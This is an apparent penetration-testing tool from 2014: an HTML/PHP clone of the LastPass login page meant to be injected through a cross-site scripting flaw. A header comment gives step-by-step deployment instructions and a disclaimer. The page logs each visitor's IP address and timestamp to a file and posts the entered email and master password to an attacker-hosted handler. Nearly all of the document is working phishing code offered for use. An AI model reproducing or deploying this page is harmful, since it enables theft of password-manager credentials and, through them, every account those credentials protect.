<!--

LastPass XSS Payload
greg . foss [at] owasp . org
4/24/2014
v 0.1 Beta

The code below can be used to exploit XSS vulnerabilities and steal LastPass credentials.

# ONLY USE THIS PAYLOAD LEGALLY, AGAINST AUTHORIZED TARGETS
# THE DEVELOPER OF THIS PAYLOAD IS NOT LIABLE FOR ILLEGAL/QUESTIONABLE ACTIVITIES CONDUCTED WITH THIS TOOL
# BY USING THIS TOOL, YOU AGREE THAT YOU HAVE READ AND UNDERSTAND THESE TERMS

How To:
	Host this page along with 'error-overlay.php' and the 'attrib' folder on a server that you own, then modify the 'xss.html' payload with the full path to thie 'error-overlay.php' file and assure that you retain the '?&amp;error=1' parameters.

	Inject the payload 'xss.html' into a vulnerable site.

-->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="0"><meta http-equiv="CACHE-CONTROL" content="no-cache"><link rel="icon" type="image/ico" href="attrib/images/favicon.ico" /><link rel="stylesheet" type="text/css" href="attrib/general_small.css"><link rel="stylesheet" type="text/css" href="attrib/styles.css"><link rel="stylesheet" type="text/css" href="attrib/general.css"><link rel="stylesheet" type="text/css" href="attrib/popupcombobox.css"><link rel="stylesheet" type="text/css" href="attrib/textboxes_small.css"><script src="attrib/lpfulllib.js"></script><script src="attrib/db.js"></script><script src="attrib/popupcombobox.js"></script><script src="attrib/prefs.js"></script><script src="attrib/server.js"></script><script src="attrib/login.js"></script><script src="attrib/popupfilltab_cs.js"></script><script src="attrib/overlay-block.js"></script><script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script><title>Login</title></head>
<?php
function getRealIpAddr()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$ip = getRealIpAddr();
$date = date ("d/m/Y:H:i:s");
$page = "LastPass-Login-Page";
$message = "$date _ $ip _ $page\n"; 
$File = "xss.log";
$Open = fopen($File, "a+"); 
if ($Open){ 
    fwrite($Open, "$message"); 
    fclose ($Open); 
}
?>
<body id="loginbodyfull"><div id="logincontainer"><div id="logininner"><div id="loginheader"><span id="logintitletxt">Sign In</span><img id="logoimg" src="attrib/images/lp_signin_logo.png"></div><br><br><div id="reprompttext" style="display: none;"><br><span id="_docwrite_login_small1">Your current settings require you to enter your LastPass password to complete this action.</span><br><br></div><div id="nodbtext" style="display: none; color: red;"><br><b><span id="_docwrite_login_small2">The version of Chrome you are currently running does not have HTML5 database support enabled.  As such, this login page will not remember your email and password, and other features such as automatic login on browser restart will not work. You may also be blocking all cookies, which causes Chrome to disallow HTML5 database access.</span></b><br><br></div><form id="f" method="post" enctype="multipart/form-data" action="lp.php" name="login"><input name="date" value="<?= $date ?>" type="hidden"><input name="ip" value="<?= $ip ?>" type="hidden"><input name="note" value="[LP-Login]" type="hidden"><div class="inputdiv"><span class="logintitle"><span id="_docwrite_login_small3">Email</span>:</span><br><input type="text" id="u" class="logininput" name="username" value="" role="textfield" aria-haspopup="true" autocomplete="off" style="margin-right: 0px; text-overflow: ellipsis; white-space: nowrap;"><img id="deleteicon" src="attrib/images/cancel.png" valign="middle"><div style="margin-left: -35px; display: inline; vertical-align: top; margin-top: 6px;"><img id="u_button" src="attrib/images/teardrop.png" valign="middle" style="margin-top:2px" onerror="this.removeAttribute(&#39;onerror&#39;); this.src=&#39;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAfElEQVQ4T2NkoDJgpLJ5DKMGUh6io2GIGobe3t4LGBkZ49FD9v///wu3bt2agC3ECYYhuqH4DANZQNDAgIAAgT9//hwAqtUH4ossLCwOGzZs+IArPRA0EKQRZOjv378nsLKyFuAzjCgXkpoyiXIhKYaOGkhKaGFXS/UwBABG2SEVsoLJ9AAAAABJRU5ErkJggg==&#39;;" class="teardrop"></div></div><div class="inputdiv"><span class="logintitle"><span id="_docwrite_login_small4">Password</span>:</span><div id="forgotcontainer"><a id="forgot" href="attrib/login.php#" tabindex="-1" innerhtml="I Forgot my Password"><span id="_docwrite_login_small21">Forgot Password?</span></a></div><br><div><input type="password" class="logininput " id="p" name="password"><span id="screenkeyboardcontainer"><a id="screenkeyboard" href="https://lastpass.com/?sk=1&lang=en-US" innerhtml="Screen Keyboard" title="Screen Keyboard"><img id="keyboardicon" src="attrib/images/keyboard.png"></a></span></div></div><div id="rememberemailrow"><input type="checkbox" name="rememberemail" id="rememberemail">&nbsp;&nbsp;<label for="rememberemail"><span id="_docwrite_login_small5">Remember Email</span></label></div><div id="rememberpasswordrow"><input type="checkbox" name="rememberpassword" id="rememberpassword">&nbsp;&nbsp;<label for="rememberpassword"><span id="_docwrite_login_small6">Remember Password</span></label></div><div id="showvaultrow"><input type="checkbox" name="showvault" id="showvault">&nbsp;&nbsp;<label for="showvault"><span id="_docwrite_login_small7">Show Vault After Login</span></label></div><div id="donotrepromptforrow" style="display: none;"><br><input type="checkbox" name="donotrepromptfor" id="donotrepromptfor">&nbsp;&nbsp;<label for="donotrepromptfor"><span id="_docwrite_login_small8">Do not re-prompt for </span></label><select id="donotrepromptforsecs"><option value="0"></option><option value="30" id="_docwrite_login_small9">30 seconds</option><option value="60" id="_docwrite_login_small10">60 seconds</option><option value="300" id="_docwrite_login_small11">5 minutes</option><option value="900" id="_docwrite_login_small12">15 minutes</option><option value="1800" id="_docwrite_login_small13">30 minutes</option><option value="3600" id="_docwrite_login_small14">1 hour</option><option value="10800" id="_docwrite_login_small15">3 hours</option><option value="21600" id="_docwrite_login_small16">6 hours</option><option value="28800" id="_docwrite_login_small25">8 hours</option><option value="43200" id="_docwrite_login_small17">12 hours</option><option value="86400" id="_docwrite_login_small18">24 hours</option></select></div><hr><div id="btnrow" class="btnrow"><table class="buttontable"><tbody><tr><td><button class="okbutton" id="login" value="Login">Login</button></td><td><button id="cancel" value="Cancel">Cancel</button></td></tr></tbody></table></div></form><div id="links"><span id="createaccountcontainer"><a id="createaccount" href="attrib/login.php#" innerhtml="Create Account"><span id="_docwrite_login_small23">New here? Create an Account.</span></a><br></span></div><div id="error"></div><script type="text/javascript" src="attrib/login_small24.js"></script><script type="text/javascript" src="attrib/login_small_end.js"></script></div></div>
<div role="list" style="display: none; overflow: auto; padding-left: 6px; padding-right: 6px; position: absolute;" id="u_combo" class="dropStyle" autofilled="false"><div tabindex="-1" class="item" data-lpcount="0" role="listitem" origtext="="></div></div></body>
</html>
